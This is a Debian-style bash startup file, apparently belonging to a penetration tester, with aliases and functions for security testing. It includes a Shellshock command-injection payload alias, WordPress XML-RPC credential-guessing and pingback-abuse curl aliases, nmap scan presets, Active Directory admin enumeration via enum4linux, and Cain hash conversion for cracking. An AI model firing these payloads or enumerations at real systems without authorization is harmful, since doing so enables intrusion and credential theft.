# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ 
> '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    #alias grep='grep --color=auto'
    #alias fgrep='fgrep --color=auto'
    #alias egrep='egrep --color=auto'
fi

# some more ls aliases
alias ll='ls -l'
alias la='ls -A'
alias l='ls -CF'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
# Set PATH variable
export PATH=$PATH:/opt/shTools:/opt/servicescan:/opt/hashcracking:/usr/share/doc/python-impacket/examples

# Wordpress
alias cwlogin='curl -D - -H "Content-Type: text/xml" -A "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>password</string></value></param></params></methodCall>" --ignore-content-length'
alias cwping='curl -D - -H "Content-Type: text/xml" -A "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" -d "<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://www.google.com/</string></value></param><param><value><string>http://victim/?p=1</string></value></param></params></methodCall>" --ignore-content-length'

# Networking
alias netrestart='ifconfig eth0 down && ifconfig eth0 up && dhclient eth0 &> /dev/null && killall dhclient && ifconfig | grep eth0 -A 1 | grep inet'
# alias netrestart='service network-manager stop && ifconfig eth0 up && service network-manager start'
ipsort () { sort -f $1 -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4 | uniq ; }
portlist () { grep open $1 | cut -d "/" -f 1 | sort -u | sed -s ':a;N;$!ba;s/\n/,/g'; }

# Nmap

nmap_common () { nmap -sS -Pn -sV -v --max-rtt-timeout 1000ms --min-hostgroup 12 --max-hostgroup 12 --max-scan-delay 150ms --min-parallelism 64 --excludefile exclude.txt -iL ip.txt -oA $1_common && servicescan.py -v -sBWE -n $1_common.xml -o $1_common.ss ;}
nmap_discovery (){ nmap -sS -Pn -v -n --open --max-rtt-timeout 1000ms --min-hostgroup 24 --max-hostgroup 24 --max-scan-delay 150ms --min-parallelism 64 --excludefile exclude.txt -p U:53,161,137,1433,T:21,22,23,80,88,139,443,445,1433,1521,8080,3268,3269,3306,3389,5900 -iL ip.txt -oA $1 discovery ;}

# Responder
alias cleanResponder='rm -fr /opt/Responder/logs/*.txt /opt/Responder/logs/*.log /opt/Responder/Responder.db'

# Nessus
nessusSSLself () { sed -e '/Detailed Output for/,/Subject/!d' $1 | grep -v '^$' | grep -v -e "The" -e "host" | sed 's/|-Subject.*CN=/Self-signed by: /' | sed -e '/ TCP (www)/s/Detailed Output for affected service: /https:\/\//' | sed 's/ TCP (www)//' | sed -e '/ TCP (msrdp)/s/Detailed Output for affected service: //' | sed 's/ TCP (msrdp)//' | sed -e '/ TCP (mssql)/s/Detailed Output for affected service: //' | sed 's/ TCP (mssql)//' | grep -v "certificate authority" | grep -v "algorithm that this" | grep -v "certificate authorities" | sed 's/\/E=.*//'; }
nessusSSLexpire () { sed -e '/Detailed Output for/,/Not valid after/!d' $1 | grep -v -e '^$' -e 'The' -e 'Subject' -e 'Issuer' -e 'before'  | sed -e '/ TCP (www)/s/Detailed Output for affected service: /https:\/\//' | sed 's/ TCP (www)//' | sed 's/  Not valid after  :/Expired/' | sed 's/GMT//' | sed 's/:443//'; }
nessusSSLweak () { sed 's/:443 TCP (www)//' $1 | sed 's/ TCP (www)//' | sed 's/^/https:\/\//'; }

# WebHunter
export QT_QPA_PLATFORM=offscreen
export PATH=$PATH:/opt/ChromedriverFolder
export PROMPT_COMMAND="echo -n \[\$(date +%d/%m/%Y-%H:%M:%S)\]\ "

# Oracle
alias sqlplus='/opt/oracle/instantclient_12_1/sqlplus'
export PATH=$PATH:/opt/oracle/instantclient_12_1
export SQLPATH=/opt/oracle/instantclient_12_1
export TNS_ADMIN=/opt/oracle/instantclient_12_1
export LD_LIBRARY_PATH=/opt/oracle/instantclient_12_1
export ORACLE_HOME=/opt/oracle/instantclient_12_1

# Enum4Linux
# enum4linux_getinfo <username> <password> <DC_IP_ADDRESS>
enum4linux_getinfo () { enum4linux -u $1 -p $2 -GPUd $3 | tee enum4linux_AD.txt &&
enum4linux_userdscr enum4linux_AD.txt &&
enum4linux_admins enum4linux_AD.txt ;}

# enum4linux_userdscr <enum4linx_file>
enum4linux_userdscr () { cat $1 | grep "Description"; }


# enum4linux_admins <enum4linx_file>
enum4linux_admins () { echo "Administrators:" &&
cat $1 | grep "Group 'Administrators'" | grep "has member" | cut -d " " -f 7 &&
echo "" && echo "Domain Admins:" &&
cat $1 | grep "Group 'Domain Admins'" | grep "has member" | cut -d " " -f 8 &&
echo "" && echo "Enterprise Admins:" &&
cat $1 | grep "Group 'Enterprise Admins'" | grep "has member" | cut -d " " -f 8 ;}

# Report
grepCVE () { grep -o "CVE-[0-9]*-[0-9]*" $1 | sort | uniq ; }

# ShellShock
alias cshock='curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c id"'

# Cain
# $1 = LMNT.LST 
cain2john () { cut -d$'\t' -f1,5,6 $1 | awk '$2 != "" { print $1"::"$2":"$3":::" }' | grep -v "PASS" | sort | uniq ;}
cainpass () { cut -d$'\t' -f4 $1 | grep -v '^$' | grep -v '* empty *'; }
cainlogins () { cut -d$'\t' -f1,4 $1 | awk '$2 != "" { print $1,$2 }' | awk '$2 != "*" { print $1,$2 }'; }
